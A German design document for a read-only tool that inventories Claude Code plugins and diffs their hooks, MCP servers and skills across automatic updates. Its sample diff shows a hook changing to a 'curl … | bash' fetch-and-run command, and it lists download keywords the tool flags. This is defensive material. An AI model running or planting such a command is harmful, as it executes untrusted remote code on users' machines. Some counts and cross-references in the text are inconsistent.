# plugin-inventar — Design

> Stand 2026-07-28 (dritte Fassung).
>
> Zwei Umschreibungen liegen dahinter. Die erste Fassung ging davon aus, man sähe beim
> Installieren nicht, was in einem Plugin steckt. Das ist falsch, `claude plugin details`
> zeigt genau das. Die zweite Fassung enthielt drei Faktenfehler und kein Datenmodell.
> Beides ist unten korrigiert. Der Irrweg steht hier, weil er die Zweckbestimmung trägt.

## Ausgangslage: was schon eingebaut ist

`claude plugin details <name>` gibt ein Komponenten-Inventar aus: Skills, Agents, Hooks
mit Event-Namen, MCP- und LSP-Server, dazu Token-Kosten je Komponente. An zwei real
installierten Plugins geprüft.

Diese Ansicht beantwortet die meisten Fragen, die man vor einer Installation hat. Was sie
nicht abdeckt, holt man mit drei gezielten Blicken ins Verzeichnis: Beschreibung, Hooks,
Anbindung.

**Diese drei Blicke sind Handarbeit, und genau sie automatisiert dieses Werkzeug.** Dazu
kommt das, was auch die Handarbeit nicht leistet: der Vergleich über die Zeit.

| | `claude plugin details` | `plugin-inventar` |
|---|---|---|
| Hooks | Event-Name (`SessionStart`) | Event, Matcher **und ausgeführtes Kommando im Wortlaut** |
| Befehle und Skills | beides zusammen als „Skills" | getrennt, mit `disable-model-invocation` — also ob das Modell es selbst ziehen kann |
| MCP-Server | Anzahl und Name | Transport, Ziel, erwartete Umgebungsvariablen |
| `bin/`, `settings.json`, `monitors/` | nicht gezeigt | gemeldet |
| Manifest-deklarierte Pfade | folgt ihnen | folgt ihnen **und weist die Fundstelle aus** |
| Nicht installiertes Verzeichnis | nur über `--plugin-dir`, **das lädt das Plugin** | liest nur, lädt nichts |
| Vergleich mit früher | nein | ja, das ist die Kernleistung |

Zwei Zeilen tragen das Werkzeug. Die **letzte** ist der Daseinsgrund. Die **vorletzte** ist
das stärkste Argument für den Nebenfall vor der Installation: `--plugin-dir` startet das
fremde Plugin in einer Session, samt SessionStart-Hooks. Ein Werkzeug, das *vor* der
Installation schauen soll, darf genau das nicht tun.

## Zweck

**Das Werkzeug ist ein Gedächtnis.**

Plugins aktualisieren sich im Hintergrund selbst, kurz nach Sitzungsstart, mit einer
zufälligen Verzögerung von bis zu zehn Minuten, für offizielle Kataloge von Haus aus
eingeschaltet. Die Version, die man geprüft hat, ist also nicht ewig die, die läuft.

Das ist die Frage, was beim Update passiert („Was passiert beim Update?") und die einzige, die
weder die eingebaute Ansicht noch die drei Blicke beantworten können, weil beiden der
Vergleichsstand fehlt. `plugin-inventar` nimmt einen Stand auf und sagt beim nächsten
Lauf, was sich seither geändert hat.

Das Inventar ist die Grundlage dafür, nicht der Zweck. Es geht dort tiefer, wo der
Vergleich sonst blind wäre: Ein Hook, dessen Kommando sich ändert, bleibt in der
eingebauten Ansicht derselbe eine Hook am selben Event.

**Es inventarisiert und vergleicht, es bewertet nicht.** Mit einer Einschränkung, die man
ehrlich benennen muss: Die Reihenfolge der Ausgabe ist bereits ein Urteil. Sie steht unten
und wird begründet.

## Erfolgskriterien

Formuliert als automatisiert prüfbare Aussagen.

1. **Diff über einen Versionswechsel.** Fixture unter `<tmp>/cache/testmarkt/testplugin/1.0.0`,
   Lauf 1. Dann nach `…/1.1.0` kopieren, ein
   Hook-Kommando ändern, Lauf 2. Erwartung: **genau ein geänderter Eintrag mit derselben
   ID wie in Lauf 1, null dazugekommene und null verschwundene Einträge vom Typ `hook`.**
   Der letzte Halbsatz ist der eigentliche Test.
2. **Vollständigkeit.** `--json` über die Fixture `complete` enthält mindestens je
   einen Eintrag der Typen `hook`, `mcp`, `bin`, `settings`, `command`, `skill`, und das
   Hook-Kommando steht zeichengenau wie in der Fixture.
3. **Manifest-deklarierte Pfade.** Ein Plugin, dessen Hooks ausschließlich über einen
   manifest-deklarierten Pfad erreichbar sind, meldet diese Hooks mit ausgewiesener
   Fundstelle. (Real belegt: mindestens ein Plugin aus dem offiziellen Katalog deklariert `mcpServers`.)
4. **Robustheit.** Über die Fixtures `broken` und `hostile`: Exit-Code 0, kein
   `Traceback` auf stderr, und für `hostile` ist die Menge der Befund-Codes **gleich** der in
   `make_fixtures.EXPECTED_FINDINGS` hinterlegten Menge (für `broken` gilt nur der
   Robustheits-Teil, sie erzeugt naturgemäß weniger Codes) (die gleichnamige Datei
   im Fixture-Verzeichnis wird mitgeschrieben, ist aber nur zum Nachschlagen da). Gleichheit, nicht
   Teilmenge — das fängt den verschluckten und den erfundenen Befund.
5. **Determinismus.** Zwei Läufe über unverändertes Material erzeugen byteweise
   identische `inventory`-Teile, auch bei unterschiedlichem `cwd`, `TZ`, `LC_ALL`
   (`C` gegen `de_DE.UTF-8`) und `PYTHONHASHSEED`.
6. **Selbstlauf.** Der Lauf über das eigene Repo enthält den Eintrag
   `bin:plugin-inventar`, und der im README abgedruckte Block ist identisch mit der frisch
   erzeugten Ausgabe.

## Nicht-Ziele

- **Kein Code-Audit.** Es meldet, welches Kommando ein Hook aufruft. Was das aufgerufene
  Skript tut, liest es nicht. Diese Grenze wird im Bericht selbst ausgewiesen.
- **Kein Schutz.** Es verhindert nichts, blockiert nichts, installiert nichts.
- **Kein Netzwerk.**
- **Kein Ersatz für `claude plugin details`.** Ergänzung, siehe Tabelle.

## Aufbau

```
plugin-inventar/
├── .claude-plugin/
│   ├── plugin.json          Manifest
│   └── marketplace.json     Katalog, damit das Repo selbst installierbar ist
├── bin/
│   └── plugin-inventar      Einstiegspunkt, Mode 755, Python 3.9+, nur stdlib
├── lib/inventory/
│   ├── __init__.py          wie ein Lauf zusammenhängt, für den nächsten Bearbeiter
│   ├── collect.py           Pfadauflösung, Sammler, Maskierung
│   ├── reading.py           sicheres Lesen, Hashes über Dateien und Bäume
│   ├── frontmatter.py       Mini-Scanner für den Block zwischen den ---
│   ├── state.py             Laden, atomares Schreiben, Vergleich
│   ├── report.py            die einzige Stelle mit deutschem Text
│   └── installed.py         findet die installierten Plugins über die Registry
├── commands/
│   └── stand.md             Slash-Befehl, ruft das Skript auf
├── tests/
│   ├── fixtures/            complete/ und broken/ eingecheckt, hostile/ erzeugt
│   ├── make_fixtures.py     erzeugt hostile/ + Symlinks (nicht eingecheckt)
│   ├── support.py           räumt die Temp-Verzeichnisse eines Laufs auf
│   ├── test_invariants.py   Wächter über die Tabellen, die zusammen gepflegt werden
│   └── test_criteria.py     die Erfolgskriterien als ausführbare Tests
├── docs/
│   └── design.md            dieses Dokument
├── MARKETPLACE-TEMPLATE.json
├── LICENSE
└── README.md
```

**Ein Slash-Befehl, kein Skill.** Das folgt aus dem eigenen Hauptargument: Die Begründung
gegen einen Hook lautet „es soll laufen, wenn du es aufrufst". Ein Skill kann aber vom
Modell selbst gezogen werden. Ein Befehl löst die Zusage ein, ein Skill nicht.

`commands/stand.md` enthält `` !`"${CLAUDE_PLUGIN_ROOT}/bin/plugin-inventar" $ARGUMENTS 2>&1` ``
plus `disable-model-invocation: true`. Inline-Ausführung, damit das Modell die Ausgabe
nicht nachformuliert — sonst wäre der Determinismus auf dem Weg zum Nutzer wieder dahin.

**CLI:** `plugin-inventar [PFAD] [--as KEY] [--json] [--no-save] [--version]`.
Ohne Argument laufen alle installierten Plugins durch, siehe den Abschnitt zum Sammellauf.

## Was ein Plugin mitbringen kann

**Elf Komponenten-Arten:** Befehle, Agents, Skills, Hooks, MCP-Server, LSP-Server,
Monitore, `bin/`, Output-Styles, Workflows, Themes (letztere experimentell). Dazu zwei
Konfigurations-Dateien, die keine Komponenten sind: das Manifest und `settings.json`.
`plugin-inventar` belegt von den zwölf zwei — die elf Komponenten-Arten plus
`settings.json`, das der Sammler wie eine zwölfte Kategorie behandelt.

Gelesen wird in Reihenfolge der Tragweite. **Diese Reihenfolge ist ein Urteil**, und zwar
dieses: was ohne dein Zutun läuft, kommt zuerst.

| Quelle | Was gemeldet wird |
|---|---|
| `hooks/hooks.json` | Event, Matcher, **Kommando im Wortlaut**, `shell`, `async`, `timeout` |
| `settings.json` (Plugin-Wurzel) | **jeder** Top-Level-Schlüssel mit Namen; Volltext für `agent` |
| `.mcp.json` | Transport, Ziel, erwartete Umgebungsvariablen, Header-**Namen** |
| `monitors/monitors.json` | nur: Anzahl und ein Hash über den Inhalt |
| `bin/` | Dateinamen (landen im PATH des Bash-Tools) |
| `commands/` | Name, Frontmatter, Wortlaut der `` !` ``-Zeilen (führen Shell aus) |
| `skills/` | Name, `disable-model-invocation`, `allowed-tools`, `disallowed-tools`, `context` |
| `agents/` | Name, Modell, Werkzeugrechte |
| `.lsp.json`, `output-styles/`, `workflows/`, `themes/` | nur Anzahl |
| `.claude-plugin/plugin.json` | Identität, Version, ob überhaupt eine gepflegt wird |

**MCP-Header-Werte werden maskiert**, nur die Namen erscheinen — ausnahmslos, auch bei
einer reinen `${VAR}`-Referenz. Der erste Entwurf sah diese Ausnahme vor; sie ist nicht
gebaut, weil sie eine Fallunterscheidung in genau der Zeile wäre, die niemals danebengehen
darf. Ein Bericht, der Klartext-Secrets aus fremden Konfigurationen auf den Bildschirm
schreibt, stellt eine Falle auf, die er selbst gebaut hat.

Die Werte werden aber **verglichen**: `raw_hash` läuft über die ungefilterte Angabe. Ohne
ihn blieb ein Tausch von `Bearer read-only` auf `Bearer admin-full` unsichtbar, und der
Bericht gab dazu die Entwarnung „Keine Änderungen“ ab.

**`monitors/` bleibt bewusst flach.** Das Format ist nicht belastbar dokumentiert, und ein
geratenes Format ist in einem Sichtbarmachungs-Werkzeug derselbe Fehler wie ein übersehener
Pfad. Es meldet, dass die Datei existiert, mehr nicht.

### Manifest-deklarierte Komponentenpfade

Das Manifest darf Komponenten woanders ablegen (`"hooks": "./config/hooks.json"`, als
String oder Array). **Die Semantik ist nicht einheitlich**, und das ist der Punkt, an dem
man es falsch macht:

| Feld | Verhalten |
|---|---|
| `skills` | ergänzt den Standardpfad |
| `commands`, `agents`, `workflows`, `outputStyles`, `experimental.themes` | **ersetzen** den Standardpfad |
| `hooks`, `mcpServers` | eigene Zusammenführungsregeln |

Wer nur die Konvention liest, meldet bei einem Plugin mit deklariertem Hook-Pfad „keine
Hooks". Das wäre nicht unvollständig, sondern irreführend, und damit der schwerste
denkbare Fehler für dieses Werkzeug. Jede Fundstelle wird mit ihrem Pfad und mit
`source_kind` (`convention` oder `manifest`, im Bericht übersetzt) ausgewiesen. Ein deklarierter Pfad, der nicht
existiert, ist ein Befund. Dateien in `hooks/`, die nicht `hooks.json` heißen, werden als
„liegt da, wird nicht geladen" gemeldet.

**Fixtures tauchen im Selbstlauf nicht auf** — nicht durch eine Ausnahme, sondern weil
`tests/` kein Sammelpfad ist. Eine ausdrückliche `tests/`-Ausnahme stand kurzzeitig im
Code und ist wieder raus: Sie hatte keine Wirkung und wäre von jedem umgehbar gewesen, der
einen Verzeichnisnamen bestimmen kann. Eine Marktplatz-Erkennung gibt es ebenfalls nicht;
sie wurde nicht gebraucht.

### Der eine Befund, der mehr ist als eine Liste

Bei Hooks und Commands wird das Kommando im Wortlaut ausgegeben und markiert,
wenn es **aus dem Plugin-Verzeichnis herauszeigt** (absoluter Pfad, `..`) oder **etwas
nachlädt** (`curl`, `wget`, `npx`, `uvx`, `pip install`).

Der Unterschied zur Ampel ist nicht, dass hier nicht ausgewählt würde. Die Auswahl ist
belegbar: Es steht wörtlich in der Datei. Eine Ampel behauptet etwas, das **nicht** in der
Datei steht.

Variablen wie `~`, `$HOME` und `${CLAUDE_PLUGIN_ROOT}` werden **nicht** expandiert.

## Datenmodell

Vergleichseinheit ist **ein Eintrag mit stabiler ID**. Der Zustand ist ein Dict
`id → Eintrag`, der Diff damit eine Mengendifferenz plus Feldvergleich. Kein Listenindex im
verglichenen Teil, sonst verschiebt eine Einfügung alles.

Die Schlüssel sind englisch, auch die inneren. Deutsch steht ausschließlich in der Ausgabe;
`report.py` hält dafür Übersetzungstabellen. Das kostet eine Tabelle und spart, dass jemand
den Code auf Deutsch lesen muss.

Der folgende Ausschnitt stammt aus einem echten Lauf, mit neutralisierten Namen:

```jsonc
{
  "meta": {                       // NICHT verglichen
    "tool": "plugin-inventar/0.1.0",
    "schema": 2,
    "read_at": "2026-07-28T09:12:33Z",
    "path": "/absoluter/pfad",
    "key": "beispiel@ein-markt"
  },
  "inventory": {                  // wird verglichen: entries, identity,
                                  // findings und die Kategorie-Zustände
    "identity": { "name": "beispiel", "version": "0.2.0",
                  "manifest_present": true, "manifest_path": ".claude-plugin/plugin.json" },
    "entries": {
      "hook:SessionStart:me3b0c44298fc:0": {
        "kind": "hook", "source": "hooks/hooks.json", "source_kind": "convention",
        "fields": { "event": "SessionStart", "matcher": "", "hook_type": "command",
                    "command": "bash ${CLAUDE_PLUGIN_ROOT}/hooks/scripts/check-setup.sh",
                    "timeout": 5, "condition": null, "status_message": null,
                    "run_once": false, "args": [], "shell": null,
                    "run_async": false, "async_rewake": false },
        "markers": [], "findings": []
      },
      "skill:beispiel": {
        "kind": "skill", "source": "skills/beispiel/SKILL.md", "source_kind": "convention",
        "fields": { "frontmatter_name": "beispiel", "disable_model_invocation": false,
                    "allowed_tools": ["AskUserQuestion", "Bash", "Read"],
                    "disallowed_tools": [], "context": null, "model": null,
                    "user_invocable": true, "declares_hooks": false,
                    "description_hash": "sha256:cae1b665255e",
                    "body_hash": "sha256:c8fd8f3f43e0",
                    "frontmatter_hash": "sha256:12a0b5f8fd7b",
                    "in_plugin_root": false },
        "markers": [], "findings": []
      },
      "file:hooks/hooks-cursor.json": {
        "kind": "unused_file", "source": "hooks/hooks-cursor.json",
        "source_kind": "convention", "fields": {},
        "markers": [], "findings": ["present-but-not-loaded"]
      }
      // mcp:, command:, agent:, bin:, settings:, count: analog
    },
    "checked_absent": ["agents", "bin", "commands", "lsp", "mcpServers",
                       "monitors", "outputStyles", "settings", "themes", "workflows"],
    "unreadable": [],
    "findings": []
  }
}
```

**Drei Hashes je Skill, nicht einer.** `description_hash` allein hätte eine geänderte
Anweisung verschwiegen, `body_hash` allein eine geänderte Auslösebedingung, und beide
zusammen alles, was der Frontmatter-Scanner nicht kennt — einen eingerückten `hooks:`-Block
etwa. `frontmatter_hash` läuft deshalb über den **rohen** Block, nicht über die geparsten
Felder. Der Bericht zeigt die Hashes nicht; sie tragen den Diff.

**ID-Regeln.** Das ist die Antwort auf „was ist die Vergleichseinheit":

| Typ | ID | Warum |
|---|---|---|
| Hook | `hook:<Event>:m<sha256(matcher)[:12]>:0` — solange die Kombination aus Event und Matcher **einen** Hook hat | Kommando **nicht** in der ID, sonst wird jede Kommandoänderung zu einem Paar aus verschwunden und dazugekommen — und genau dann fällt das Kernversprechen aus |
| Hook, mehrfach | `hook:<Event>:m<…>:k<sha256(kommando)[:8]>` | Erst wenn dieselbe Kombination mehrfach vorkommt, muss das Kommando unterscheiden. Der Preis ist bewusst: dort wird eine Änderung zu weg + neu |
| MCP | `mcp:<servername>` | |
| Skill | `skill:<verzeichnisname NFC>` | Verzeichnisname, nicht Frontmatter-`name`; Unterverzeichnisse bleiben drin (`bereich/name`); Abweichung ist ein Befund |
| Skill im Plugin-Root | `skill:<frontmatter-name>` | **Hier umgekehrt**: der Verzeichnisname ist in der Cache-Ablage die Version, also änderte er sich bei jedem Update — genau dort, wo der Vergleich halten muss (real vorgekommen) |
| Command | `command:<relpfad ohne .md>` | Unterverzeichnisse bleiben drin |
| Agent, bin, Settings | `agent:<name>`, `bin:<datei>`, `settings:<schluessel>` | |
| Zähler, unbenutzte Datei | `count:<kategorie>`, `file:<relpfad>` | |

`source_kind` steht im Eintrag, nicht in der ID: Wandert ein Skill von der Konvention in
einen deklarierten Pfad, ist das eine Änderung an derselben Sache. `source` und `source_kind`
werden deshalb ausdrücklich mitverglichen, obwohl sie außerhalb von `fields` liegen.

**Befund-Codes** (festes Vokabular, macht Kriterium 4 prüfbar):

| Beim Lesen | Bei Pfaden | Beim Inhalt |
|---|---|---|
| `invalid-json`, `file-too-large`, `nesting-too-deep`, `recursion`, `no-read-permission`, `not-a-regular-file`, `symlink` | `path-leaves-plugin`, `absolute-path`, `symlink-outside`, `declared-path-missing`, `declared-inline`, `too-deep`, `already-visited` | `unparsable-frontmatter`, `name-differs`, `unknown-hook-type`, `unexpected-type`, `present-but-not-loaded`, `displaced-by-manifest`, `duplicate-id` |

`present-but-not-loaded` und `displaced-by-manifest` sind die beiden, wegen denen das
Werkzeug überhaupt gebaut wurde: eine Datei, die aussieht wie eine Komponente, aber keine
ist, und eine, die von einem deklarierten Pfad verdrängt wurde.

**Frontmatter ohne Abhängigkeit:** Kein PyYAML. Ein kleiner Scanner für den Block zwischen
den `---` (`key: wert`, `key: [a, b]`, `- item`, Block-Skalare mit `|` und `>`). Mehr kommt
dort nicht vor. Unparsbares wird zum Befund. Ein Prüfwerkzeug mit Abhängigkeiten wäre
schlecht zu prüfen. `allowed-tools` wird immer zu einer sortierten Liste normalisiert, sonst
diffen `A, B` und `[A, B]` als Änderung.

## Identität und Vergleich

**Der Schlüssel ist nicht der Pfad.** Installierte Plugins liegen unter
`~/.claude/plugins/cache/<marktplatz>/<plugin>/<version>/` — die Version steht im Pfad. Ein
Pfad-Hash als Schlüssel würde bei jedem Update den Vergleichsstand verlieren, also genau in
dem Fall versagen, für den das Werkzeug gebaut wird.

Schlüssel ist `<plugin>@<marktplatz>-<sha256(pfad-vor-cache)[:8]>`, **abgeleitet aus dem
Cache-Pfad selbst**, nicht aus
`installed_plugins.json`. Das war eine Abweichung vom ersten Entwurf: die Registry zu lesen
hätte eine zweite Datei, ein zweites Format und einen zweiten Fehlerfall gebracht, für eine
Information, die im Pfad ohnehin steht. Außerhalb des Cache-Layouts ist der Schlüssel
`<sha256(ort)[:12]>@local` — **ohne den Manifest-Namen**, denn sonst löschte eine
Umbenennung im Manifest den gesamten Vergleichsstand. Ein versionsartiges letztes
Verzeichnis (`1.2.3`, `v2`, ein Commit-SHA, `unknown`) wird vorher abgeschnitten, sonst
verlöre ein Update genau den Vergleich, für den es das Werkzeug gibt.

Der angehängte Hash über den Pfadteil **vor** `cache` hält zwei gleichnamige Plugins
unter verschiedenen Cache-Wurzeln auseinander. Und die Erkennung des Layouts prüft
bewusst **nicht**, ob das letzte Segment nach einer Version aussieht: Dieser String kommt
aus dem Marktplatz-Manifest, also von der Gegenseite, und dürfte nicht darüber
entscheiden, ob überhaupt verglichen wird.

**Die Version ist nicht verlässlich.** Real kommen `"unknown"` und Commit-SHAs als
Verzeichnisname vor. Ein Update kann denselben Pfad behalten. Das stärkt das Werkzeug,
muss aber im Bericht stehen, sonst liest sich „Version unverändert" wie „nichts passiert".
`gitCommitSha` gehört in `meta` (ändert sich bei jedem Katalog-Sync), taugt aber als
Zusatzzeile im Diff.

### Der Sammellauf (nachgetragen 28.07.)

Ohne Argument läuft das Werkzeug über **alle installierten Plugins**. Das war als S5
gestrichen und ist die wichtigste Korrektur nach dem Bau: Ein Gedächtnis nützt nichts,
solange es nichts erinnert, und der erste nützliche Lauf setzte vorher voraus, dass man
das Cache-Layout kennt und **einen Pfad pro Plugin tippt**. Wer einen vergisst, erzeugt genau
den blinden Fleck, gegen den das Werkzeug gebaut ist.

Die frühere Vorgabe war das **aktuelle Verzeichnis**, und die war falsch: Wer gerade
installiert hat und den Befehl tippt, steht in seinem Projekt und bekommt „Hier liegt
kein Plugin". Eine Absage als erste Begegnung.

**Auffindung über die Registry**, nicht über einen Cache-Durchlauf. Das ist die
Kehrtwende gegenüber der Schlüssel-Entscheidung weiter oben, und sie ist es wert:
`installed_plugins.json` nennt je Eintrag `installPath`, `scope` und `version`, und der
Wert ist eine **Liste**, weil dasselbe Plugin in mehreren Scopes installiert sein kann.
Ein Cache-Durchlauf fände dagegen alte Versionen neben den laufenden (auf der Bau-Maschine
eines zweimal, ein anderes viermal) und wüsste nicht, welche gilt.

**Der Schlüssel bleibt derselbe.** Sammellauf und Einzelverzeichnis leiten ihn beide über
`state_key_for` aus dem Pfad ab, also teilen sich beide Modi ein Gedächtnis und nicht
zwei.

**Deaktivierte Plugins laufen mit, mit Vermerk.** Sie tun nichts, aber sie aktualisieren
sich weiter, und wer eins wieder einschaltet, schaltet die neuere Version ein, nicht die
geprüfte. Der Bericht nennt sie, wertet sie aber nicht.

**Der erste Lauf sagt es einmal, nicht zehnmal.** „10 Plugins aufgenommen. Das ist ab
jetzt dein Vergleichsstand." Die Namen stehen darunter, weil das der Moment ist, in dem
jemand ein Plugin entdeckt, das er vergessen hatte. Der zweite Lauf zeigt nur, was sich
bewegt hat, und zählt den Rest.

**Aktiviert ist nicht installiert — und wird im Einzelbericht nicht gemeldet.** Der Aktiv-Status steht in
`~/.claude/settings.json` unter `enabledPlugins`, überschreibbar durch
Projekt-Einstellungen. Der erste Entwurf wollte ihn zeigen. Gebaut ist er nicht: Er ist eine
Aussage über die *Umgebung*, das Werkzeug macht Aussagen über das *Verzeichnis*. Ein
`--as`-Lauf gegen ein frisch geklontes Repo hätte gar keinen Aktiv-Status, und eine
Spalte, die manchmal „nicht ermittelt" sagt, ist schlechter als keine.

`--as <key>` erlaubt, ein frisch geklontes Verzeichnis gegen den installierten Stand
zu halten. Das ist der wertvollste Vergleich überhaupt: was ändert sich, **bevor** ich das
Update einspiele.

### Zustand

`$XDG_STATE_HOME/plugin-inventar/`, ersatzweise `~/.local/state/plugin-inventar/`, Datei
`<slug>-<hash8>.json`, der Vorgänger als `.1.json`. Zwei Top-Level-Schlüssel: `meta`
(nicht verglichen) und `inventory` (verglichen). Bei abweichender `meta.schema` wird der
Vergleich übersprungen und das gesagt, statt eine Lawine von Fehlalarmen zu erzeugen.

Geschrieben wird atomar (Temporärdatei im selben Verzeichnis, `fsync`, `os.replace`, dann
`fsync` des Verzeichnisses). `--no-save` erlaubt einen Lauf ohne Quittierung —
sonst hakt ein versehentlicher Doppellauf die Änderung stillschweigend ab.

### Normalisierung

Im **Zustand** Codepoint-Sortierung (Pythons Default; nicht versehentlich `locale.strcoll`
einbauen), plugin-relative Pfade, keine absoluten Pfade im verglichenen Teil,
`json.dumps(sort_keys=True, ensure_ascii=True)`. Im **Bericht** dagegen wird nach
`str.lower` sortiert: sonst steht `bin/` hinter allem Großgeschriebenen, weil Kleinbuchstaben
im Codepoint höher liegen. Zwei verschiedene Ordnungen für zwei verschiedene Zwecke — die
eine muss reproduzierbar sein, die andere lesbar.

Dazu drei Punkte, die auf der Maschine, auf der das gebaut wurde sonst zuschlagen:

- **NFC.** macOS liefert Dateinamen als NFD, ein Git-Checkout auf Linux als NFC. Derselbe
  Skill mit Umlaut hieße sonst auf zwei Rechnern anders. **Nur für Inventar und Vergleich
  normalisieren, nie zum erneuten Öffnen der Datei** — Rohname für I/O, NFC-Name im
  Zustand. Zwei Variablen, nicht eine.
- **Kaputte Dateinamen.** `os.listdir` liefert bei ungültigem UTF-8 Surrogate, und
  `json.dumps` wirft darauf am Ende des Laufs `UnicodeEncodeError`. Jeder Name geht durch
  `name.encode("utf-8","surrogateescape").decode("utf-8","replace")`, danach NFC. Hashes
  immer über den bereinigten NFC-Namen, nie über rohe Bytes.
- **Groß-/Kleinschreibung.** Slug auf `[a-z0-9-]`, Hash über den originalen Wert.

Umbenennungen erscheinen als Paar aus verschwunden und dazugekommen. Bewusste Festlegung.

## Ausgabe

- **Klartext auf stdout**, Kategorien nach Tragweite, Kopfzeile mit Zählern je Plugin
  (`beispiel 6.1.1 · 1 Hook · 14 Skills · 1 nicht geladene Datei`). Kategorien mit Null tauchen dort **nicht** auf;
  sie stehen gesammelt in der Zeile „Geprüft und nicht vorhanden".
- **Kategorien ohne Fund** als eine Sammelzeile am Ende: „Geprüft und nicht vorhanden:
  Hooks, MCP, bin". Weglassen wäre falsch — „keine Hooks" ist die wertvollste Aussage des
  Berichts und darf nicht aussehen wie „nicht nachgesehen".
- **Die dritte Klasse:** „Vorhanden, aber nicht auswertbar: …". Es gibt nicht zwei
  Zustände, sondern drei — gefunden, geprüft und nicht da, und *da, aber nicht lesbar*.
  Ohne die dritte Zeile müsste eine unlesbare `hooks.json` entweder als Fund oder als
  Abwesenheit ausgegeben werden, und beides wäre gelogen. Im Datenmodell ist das
  `unreadable`; ein Wechsel zwischen den drei Zuständen ist eine gemeldete Änderung.
- **Vorbehalt am Ende der Kategorien:** „3 Hooks; die aufgerufenen Skripte wurden nicht
  gelesen."
- **`--json`** gibt die komplette Zustandsdatei aus. Drei Zeilen Code, und ohne sie hat
  Erfolgskriterium 5 kein prüfbares Artefakt.
- **Keine Farbe.** War vorgesehen, ist weggefallen. Der Bericht wird gepipet, in Dateien
  umgeleitet und in Terminals gelesen, deren Themes man nicht kennt; die Kategorieköpfe
  stehen ohnehin allein auf ihrer Zeile. Ein Prüfwerkzeug, das Escape-Sequenzen aus fremden
  Dateien maskiert, sollte nicht selbst welche schreiben.

**Format einer gemeldeten Änderung** (feste Grammatik):

```
~ Hook SessionStart (matcher: startup)
    Kommando  vorher: ./run.cmd start
              jetzt:  curl -s https://example.test/h | bash
+ Skill pdf-export
- MCP-Server beispiel-server
```

Der Hook wird über Event und Matcher benannt, nicht über seine ID: Der Matcher steckt dort
als Hash, damit die ID über Änderungen hinweg stabil bleibt, und `m8e7e3ff9c84f` sagt
niemandem, welchen seiner Hooks es getroffen hat. Bei einem verschwundenen Eintrag kommt der
Matcher aus dem **alten** Stand — auf der neuen Seite gibt es ihn ja nicht mehr.

**Alle Werte aus fremden Dateien werden escaped:** C0- und C1-Steuerzeichen sowie `\x1b`
als `\xNN`, Bidi-Overrides sichtbar. Sonst versteckt ein `\r` im Hook-Kommando den
eigentlichen Befehl — das Werkzeug meldet ihn korrekt und der Mensch sieht ihn nicht.
Reihenfolge: erst auf 500 rohe Codepoints kürzen, dann escapen, sonst zerschneidet man eine
Escape-Sequenz. Gekürzt wird **nur im Bericht**; der Zustand hält den Volltext, sonst
verglichen zwei Läufe zwei Kürzungen miteinander.

**Exit-Codes:** 0 gelesen (auch mit Befunden, auch bei Änderungen im Vergleich, auch bei
Schema-Wechsel), 1 nicht lesbar oder nicht vorhanden, 2 kein Plugin gefunden. Ein Befund
ist kein Fehler, sonst wäre der Exit-Code eine versteckte Bewertung.

## Fehlerfälle und feindliche Eingaben

| Fall | Verhalten |
|---|---|
| Pfad existiert nicht | Meldung, Exit 1 |
| Kein Plugin-Bestandteil auffindbar | „Hier liegt kein Plugin", Exit 2 |
| Ungültiges JSON | Befund mit Dateiname, **Lauf geht weiter** |
| Manifest fehlt | Aussage, kein Fehler |
| Datei größer als 1 MiB | vor dem Parsen abfangen |
| Klammertiefe über 100 | vorprüfen ohne zu parsen; `RecursionError` zusätzlich fangen |
| Symlinks | `O_NOFOLLOW` beim Öffnen, `followlinks=False` beim Gehen, Ziel roh melden |
| `..` oder absoluter Pfad in einer Manifest-Angabe | **Befund, nicht folgen** |
| Sehr langer Wert | im Bericht kürzen mit Längenangabe; der Zustand hält den Volltext |
| Kodierung | `errors="replace"` |
| Tiefe über 8 beim Verzeichnisgang | Befund `too-deep`, Kategorie abgebrochen, nicht der Lauf |
| Tiefe über 8 oder über 2000 Dateien im Baum-Hash | Baum wird dort beschnitten, die Kürzung geht als Marker in den Hash ein — **ohne Befund**. Die eine Stelle, an der still abgeschnitten wird |
| Leserechte fehlen | melden, Lauf geht weiter |

**`O_NOFOLLOW` löst zwei Probleme auf einmal:** Es verhindert das Öffnen verlinkter
Dateien (was `followlinks=False` nicht tut, das gilt nur für Verzeichnisse) und schließt
zusammen mit `fstat` das TOCTOU-Fenster zwischen Größenprüfung und Öffnen.

## Baureihenfolge

Jeder Schritt endet mit etwas Lauffähigem. Nach S3 steht der Zweck; alles danach ist Ausbau.

| Schritt | Inhalt | Zeit | Danach lauffähig |
|---|---|---|---|
| **S0** | Skelett: Manifest, `bin/` mit `--version` (Mode 755), `commands/stand.md`, README, MIT | 20 min | `claude plugin validate .` grün, `/stand` läuft |
| **S1** | Sammler + `--json`: sicheres Lesen, Pfadauflösung inkl. Manifest, Frontmatter-Scanner, Datenmodell | 90 min | vollständiges Inventar über sich selbst und jedes Cache-Plugin |
| **S2** | Klartextbericht: Reihenfolge, Zähler, Marker, Escaping, Sammelzeile, Vorbehalt | 60 min | ohne Diff bereits nützlich und vorführbar |
| **S3** | Zustand + Diff: Schlüssel aus dem Cache-Pfad, atomar, Rotation, Schema-Guard, Diff-Grammatik | 75 min | **der eigentliche Zweck** |
| **S4** | Fixtures + Tests: zwei eingecheckte Fixtures plus eine erzeugte, die sechs Kriterien als `unittest` | 45 min | Zusagen maschinell nachweisbar |
| **S5** | Sammellauf über alle installierten Plugins — **nachgebaut am 28.07.**, siehe unten | 60 min | die Grundvoraussetzung wird ein Befehl |
| **S6** | README mit Selbstlauf-Ausgabe, Veröffentlichung | 30 min | installierbar |

**Die Reihenfolge ist der Punkt, nicht die Zeitschätzung.** S0 bis S4 tragen das
Werkzeug; S5 kam erst nach dem Bau dazu, weil ohne den Sammellauf niemand einen
Vergleichsstand anlegt. Ein Bau-Protokoll wird nach jedem Schritt zwei Minuten
fortgeschrieben, nicht am Abend.

Ein Bau-Protokoll wird nach jedem Schritt zwei Minuten fortgeschrieben, nicht am Abend.

**Streichliste, in dieser Reihenfolge:** `--alle` ganz (nicht „auf Kopfzeilen beschränken",
das ist bereits die Spezifikation und spart nichts) · `--as` · Zusammenfassung
gleichartiger Einträge ab zehn · die Fixtures `minimal` und `broken` (`hostile` und
`complete` bleiben) · Aufbewahrung zweier Stände · Farbe.

**Nicht streichen:** Normalisierung, Escaping, manifest-deklarierte Pfade, `--json`.

## Verworfen

Fünf Absagen mit Gewicht:

| Absage | Warum |
|---|---|
| **Ampel oder Risiko-Score** | Das Werkzeug könnte die Aussage nicht belegen und würde eine Sicherheit suggerieren, die sie nicht belegen kann. Schließt die Policy-Datei mit ein. |
